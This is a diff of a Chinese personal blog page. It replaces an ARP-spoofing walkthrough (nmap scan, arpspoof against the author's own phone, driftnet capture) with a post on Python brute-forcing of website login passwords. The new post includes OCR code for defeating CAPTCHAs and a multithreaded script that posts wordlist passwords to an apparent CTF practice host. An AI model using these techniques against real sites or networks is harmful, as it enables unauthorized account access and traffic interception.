@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="网络安全,arp入侵,nmap,arpspoof," />
+  <meta name="keywords" content="暴力破解,python,ctf," />
 
 
 
@@ -87,26 +87,19 @@
 
 
 
-<meta name="description" content="什么是arp入侵ARP毒化也被称为ARP缓存中毒和ARP欺骗攻击,这是在内网的中间人攻击。ARP欺骗采取的优势是通过ARP协议欺骗,达到对整个网络进行欺骗。
-环境搭建首先，实验中所有主机在同一个局域网下，比如我的电脑，手机同时连接到寝室的wifi，他们就处于同一个局域网。这次我使用的攻击者是电脑中安装有kali linux系统的虚拟机，受害者是我的手机。（这里用虚拟机做攻击者，就需要将虚拟机与主机">
+<meta name="description" content="python爬虫暴力破解网站登陆密码（二）上一篇主要介绍了一个基本的暴力破解爬虫的构成，但是他在实际使用的时候存在很多缺陷，比如速度很慢，遇到验证码无法进行等问题，这篇博客主要介绍验证码处理和多线程处理模块。  
+0x00 处理验证码网站区别人类用户和爬虫还有一个最常用的方法，那就是验证码，验证码（CAPTCHA）全称是全自动区分计算机和人类的公开图灵测试。可以说验证码就是为了阻止脚本而被发明的。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="arp入侵">
-<meta property="og:url" content="http://yoursite.com/2017/05/06/arp入侵/index.html">
+<meta property="og:title" content="python爬虫暴力破解网站登陆密码（二）">
+<meta property="og:url" content="http://yoursite.com/2017/09/01/python爬虫暴力破解网站登陆密码（二）/index.html">
 <meta property="og:site_name" content="西行妖">
-<meta property="og:description" content="什么是arp入侵ARP毒化也被称为ARP缓存中毒和ARP欺骗攻击,这是在内网的中间人攻击。ARP欺骗采取的优势是通过ARP协议欺骗,达到对整个网络进行欺骗。
-环境搭建首先，实验中所有主机在同一个局域网下，比如我的电脑，手机同时连接到寝室的wifi，他们就处于同一个局域网。这次我使用的攻击者是电脑中安装有kali linux系统的虚拟机，受害者是我的手机。（这里用虚拟机做攻击者，就需要将虚拟机与主机">
-<meta property="og:image" content="http://img.blog.csdn.net/20161106115018207">
-<meta property="og:image" content="http://img.blog.csdn.net/20161106115054199">
-<meta property="og:image" content="http://img.blog.csdn.net/20161106115122512">
-<meta property="og:image" content="http://img.blog.csdn.net/20161106115148270">
-<meta property="og:image" content="http://img.blog.csdn.net/20161106115220020">
-<meta property="og:image" content="http://img.blog.csdn.net/20161106115244082">
-<meta property="og:updated_time" content="2017-05-11T03:41:36.593Z">
+<meta property="og:description" content="python爬虫暴力破解网站登陆密码（二）上一篇主要介绍了一个基本的暴力破解爬虫的构成，但是他在实际使用的时候存在很多缺陷，比如速度很慢，遇到验证码无法进行等问题，这篇博客主要介绍验证码处理和多线程处理模块。  
+0x00 处理验证码网站区别人类用户和爬虫还有一个最常用的方法，那就是验证码，验证码（CAPTCHA）全称是全自动区分计算机和人类的公开图灵测试。可以说验证码就是为了阻止脚本而被发明的。">
+<meta property="og:updated_time" content="2017-09-01T11:33:36.175Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="arp入侵">
-<meta name="twitter:description" content="什么是arp入侵ARP毒化也被称为ARP缓存中毒和ARP欺骗攻击,这是在内网的中间人攻击。ARP欺骗采取的优势是通过ARP协议欺骗,达到对整个网络进行欺骗。
-环境搭建首先，实验中所有主机在同一个局域网下，比如我的电脑，手机同时连接到寝室的wifi，他们就处于同一个局域网。这次我使用的攻击者是电脑中安装有kali linux系统的虚拟机，受害者是我的手机。（这里用虚拟机做攻击者，就需要将虚拟机与主机">
-<meta name="twitter:image" content="http://img.blog.csdn.net/20161106115018207">
+<meta name="twitter:title" content="python爬虫暴力破解网站登陆密码（二）">
+<meta name="twitter:description" content="python爬虫暴力破解网站登陆密码（二）上一篇主要介绍了一个基本的暴力破解爬虫的构成，但是他在实际使用的时候存在很多缺陷，比如速度很慢，遇到验证码无法进行等问题，这篇博客主要介绍验证码处理和多线程处理模块。  
+0x00 处理验证码网站区别人类用户和爬虫还有一个最常用的方法，那就是验证码，验证码（CAPTCHA）全称是全自动区分计算机和人类的公开图灵测试。可以说验证码就是为了阻止脚本而被发明的。">
 
 
 
@@ -134,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/05/06/arp入侵/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/09/01/python爬虫暴力破解网站登陆密码（二）/"/>
 
 
 
 
 
-  <title> arp入侵 | 西行妖 </title>
+  <title> python爬虫暴力破解网站登陆密码（二） | 西行妖 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -269,7 +262,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/06/arp入侵/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/01/python爬虫暴力破解网站登陆密码（二）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="辣鸡棉花糖">
@@ -290,7 +283,7 @@
             
             
               
-                arp入侵
+                python爬虫暴力破解网站登陆密码（二）
               
             
           </h1>
@@ -305,8 +298,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-06T22:05:03+08:00">
-                2017-05-06
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-01T19:32:43+08:00">
+                2017-09-01
               </time>
             
 
@@ -328,8 +321,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络安全/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全</span>
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
                   </a>
                 </span>
 
@@ -345,7 +338,7 @@
 
           
           
-             <span id="/2017/05/06/arp入侵/" class="leancloud_visitors" data-flag-title="arp入侵">
+             <span id="/2017/09/01/python爬虫暴力破解网站登陆密码（二）/" class="leancloud_visitors" data-flag-title="python爬虫暴力破解网站登陆密码（二）">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -373,7 +366,7 @@
                   <span class="post-meta-item-text">阅读时长</span>
                 
                 <span title="阅读时长">
-                  2
+                  3
                 </span>
               
             </div>
@@ -392,11 +385,18 @@
       
 
       
-        <h1 id="什么是arp入侵"><a href="#什么是arp入侵" class="headerlink" title="什么是arp入侵"></a>什么是arp入侵</h1><p>ARP毒化也被称为ARP缓存中毒和ARP欺骗攻击,这是在内网的中间人攻击。ARP欺骗采取的优势是通过ARP协议欺骗,达到对整个网络进行欺骗。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先，实验中所有主机在同一个局域网下，比如我的电脑，手机同时连接到寝室的wifi，他们就处于同一个局域网。<br>这次我使用的攻击者是电脑中安装有kali linux系统的虚拟机，受害者是我的手机。（这里用虚拟机做攻击者，就需要将虚拟机与主机连接模式改为桥接模式，具体方法百度上很多，就不在这里描述）</p>
-<h2 id="扫描局域网内存活主机"><a href="#扫描局域网内存活主机" class="headerlink" title="扫描局域网内存活主机"></a>扫描局域网内存活主机</h2><p>我要攻击一个受害者，肯定要知道他的ip地址，而怎么能获取他的ip地址呢？这里就需要kali中的一个强大的工具——nmap。<br>这里我先查看自己虚拟机的ip地址和子网掩码，就能知道同一wifi下的主机的ip区间了。<br><img src="http://img.blog.csdn.net/20161106115018207" alt="查看自己的ip"><br>然后我发现自己的ip是192.168.0.108，子网掩码是255.255.255.0，所以我就知道了同一wifi下的主机肯定在192.168.0.1到192.168.0.255之间了。接下来就可以用nmap中的一个扫描方式扫描给定ip区间所有存活主机了。（nmap还有很多用途，可以去百度了解）<br><img src="http://img.blog.csdn.net/20161106115054199" alt="扫描存活主机"><br>这里扫出来六台主机，其中192.168.0.1是路由器地址，然后可以看到我的手机meizu对应的ip地址是192.168.0.103。</p>
-<h2 id="进行arp毒化"><a href="#进行arp毒化" class="headerlink" title="进行arp毒化"></a>进行arp毒化</h2><p>接下来就是攻击过程了，首先开启linux的ip转发功能。<br><img src="http://img.blog.csdn.net/20161106115122512" alt="开启ip转发并检查一次"><br>下来这两句arpspoof指令是让手机发往路由器和路由器发往手机的数据先通过我的虚拟机（攻击者）再发送出去。这样他的所有数据都要通过我。<br><img src="http://img.blog.csdn.net/20161106115148270" alt="劫持"><br>接下来我们可以用个图片捕获工具driftnet来试试效果。<br>我的手机搜索蕾蒂西亚有关的图片<br><img src="http://img.blog.csdn.net/20161106115220020" alt="手机搜索"><br>然后用driftnet来查看<br><img src="http://img.blog.csdn.net/20161106115244082" alt="deiftnet窗口"><br>可以看到我们捕获到了手机正在搜索的图片，已经劫持成功了，我们可以做到的不止这些，kali中还有很多强大的工具可以去尝试。</p>
-<p>  这篇博客是从自己的CSDN博客搬运过来的<a href="http://blog.csdn.net/echo_hun/article/details/53053665" target="_blank" rel="external">手机连接着公共wifi到底安全吗——一次简单arp毒化 </a>不是抄袭哦。现在主要就用这个博客了，所以我自己在各个网站的博客都会搬运来这里。</p>
+        <h1 id="python爬虫暴力破解网站登陆密码（二）"><a href="#python爬虫暴力破解网站登陆密码（二）" class="headerlink" title="python爬虫暴力破解网站登陆密码（二）"></a>python爬虫暴力破解网站登陆密码（二）</h1><p>上一篇主要介绍了一个基本的暴力破解爬虫的构成，但是他在实际使用的时候存在很多缺陷，比如速度很慢，遇到验证码无法进行等问题，这篇博客主要介绍验证码处理和多线程处理模块。  </p>
+<h2 id="0x00-处理验证码"><a href="#0x00-处理验证码" class="headerlink" title="0x00 处理验证码"></a>0x00 处理验证码</h2><p>网站区别人类用户和爬虫还有一个最常用的方法，那就是验证码，验证码（CAPTCHA）全称是全自动区分计算机和人类的公开图灵测试。可以说验证码就是为了阻止脚本而被发明的。可是当某些网站的验证码比较清晰好识别的时候，我们就可以借助计算机光学识别实现了。对于复杂的验证码，可以使用一些验证码处理的api（绝大多数是付费的）这些接口会有人工处理，一般30秒之内就能返回结果。    </p>
+<p>光学识别示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from Tkinter import *</div><div class="line">tk= Tk()</div><div class="line">import pytesseract</div><div class="line">from PIL import Image</div><div class="line">x=1</div><div class="line">for i in range(5):</div><div class="line">    img = Image.open(&quot;%s.png&quot; %x)</div><div class="line">    gray = img.convert(&apos;L&apos;)</div><div class="line">    gray.save(&apos;%s_1.png&apos; %x)</div><div class="line">    bw = gray.point(lambda x: 0 if x &lt; 200 else 255,&apos;1&apos;)</div><div class="line">    bw.save(&apos;%s_2.png&apos; %x)</div><div class="line">    img.show()</div><div class="line">    print(pytesseract.image_to_string(bw))</div><div class="line">    x+=1</div></pre></td></tr></table></figure></p>
+<h2 id="0x01-多线程、多进程"><a href="#0x01-多线程、多进程" class="headerlink" title="0x01 多线程、多进程"></a>0x01 多线程、多进程</h2><p>在暴力破解中需要的时间本就十分漫长，如果字典过大仍然使用串行处理，时间会长到一个不可思议的程度，为了尽量减少花费的时间，我们采用多线程或者多进程并行处理的方式提升处理速度。这里我们采用多线程作为例子，因为python实现多线程十分方便。  </p>
+<p>多线程原理：<br>同一时间内，CPU只能处理1条线程，只有1条线程在工作（执行）;多线程并发（同时）执行，其实是CPU快速地在多条线程之间调度（切换）。如果CPU调度线程的时间足够快，就造成了多线程并发执行的假象。  </p>
+<p>多线程优缺点：  </p>
+<ul>
+<li>优点：大大提高运行效率。</li>
+<li>缺点：开启线程需要占用一定的内存空间（默认情况下，主线程占用1M，子线程占用512KB），如果开启大量的线程，会占用大量的内存空间，降低程序的性能；线程越多，CPU在调度线程上的开销就越大。  </li>
+</ul>
+<p>多线程示例：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from threading import Thread</div><div class="line"></div><div class="line">def boom():</div><div class="line">    data = &#123;&apos;pwd&apos;:password&#125;</div><div class="line">    print password</div><div class="line">    content = requests.post(url,data=data)</div><div class="line">    content.encoding=&apos;utf-8&apos;</div><div class="line">    html=content.text</div><div class="line">    if html != recv:</div><div class="line">        print html</div><div class="line">#dname = input(&quot;input dname:&quot;)</div><div class="line">url=&apos;http://120.24.86.145:8002/baopo/?yes&apos;</div><div class="line">data = &#123;&apos;pwd&apos;:123&#125;</div><div class="line"></div><div class="line">content = requests.post(url,data=data)</div><div class="line">content.encoding=&apos;utf-8&apos;</div><div class="line">recv=content.text</div><div class="line"></div><div class="line">passFile = open(r&apos;C:\Users\Leticia\Desktop\mutou.txt&apos;)</div><div class="line"></div><div class="line">for line in passFile.readlines():</div><div class="line">    password = line.strip(&apos;\n&apos;)</div><div class="line">    t = Thread(target=boom)</div><div class="line">    t.start()</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -426,13 +426,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/网络安全/" rel="tag"># 网络安全</a>
+            <a href="/tags/暴力破解/" rel="tag"># 暴力破解</a>
           
-            <a href="/tags/arp入侵/" rel="tag"># arp入侵</a>
+            <a href="/tags/python/" rel="tag"># python</a>
           
-            <a href="/tags/nmap/" rel="tag"># nmap</a>
-          
-            <a href="/tags/arpspoof/" rel="tag"># arpspoof</a>
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
           
         </div>
       
@@ -445,8 +443,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/04/26/用字符数组实现2的n次方（大数问题）/" rel="next" title="用字符数组实现2的n次方（大数问题）">
-                <i class="fa fa-chevron-left"></i> 用字符数组实现2的n次方（大数问题）
+              <a href="/2017/06/26/python爬虫暴力破解网站登陆密码（一）/" rel="next" title="python爬虫暴力破解网站登陆密码（一）">
+                <i class="fa fa-chevron-left"></i> python爬虫暴力破解网站登陆密码（一）
               </a>
             
           </div>
@@ -454,10 +452,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/05/11/使用python-pyinstaller打包python程序为exe/" rel="prev" title="使用python pyinstaller打包python程序为exe">
-                使用python pyinstaller打包python程序为exe <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -586,7 +580,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是arp入侵"><span class="nav-number">1.</span> <span class="nav-text">什么是arp入侵</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扫描局域网内存活主机"><span class="nav-number">1.2.</span> <span class="nav-text">扫描局域网内存活主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进行arp毒化"><span class="nav-number">1.3.</span> <span class="nav-text">进行arp毒化</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#python爬虫暴力破解网站登陆密码（二）"><span class="nav-number">1.</span> <span class="nav-text">python爬虫暴力破解网站登陆密码（二）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-处理验证码"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 处理验证码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-多线程、多进程"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 多线程、多进程</span></a></li></ol></li></ol></div>
             
 
           </div>
